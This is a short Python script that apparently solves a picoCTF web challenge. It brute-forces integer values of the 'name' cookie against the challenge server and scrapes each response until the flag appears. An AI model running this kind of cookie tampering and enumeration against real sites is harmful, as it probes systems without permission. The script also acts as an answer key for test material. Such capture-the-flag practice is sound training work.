import requests

URL = "http://mercury.picoctf.net:21485/"
BEFORE_RESULT = '<p style="text-align:center; font-size:30px;">'
AFTER_RESULT = '</p>'

curr_cookie = ''
i = -1
while 'picoCTF' not in curr_cookie:
    i += 1
    res = requests.get(URL, cookies={'name': str(i)})
    curr_cookie = res.text[res.text.find(BEFORE_RESULT) + len(BEFORE_RESULT):]
    curr_cookie = curr_cookie[:curr_cookie.find(AFTER_RESULT)]
    print(i, curr_cookie)

flag = curr_cookie[curr_cookie.find('picoCTF'):curr_cookie.find('}') + 1]
print('Flag: ', flag)
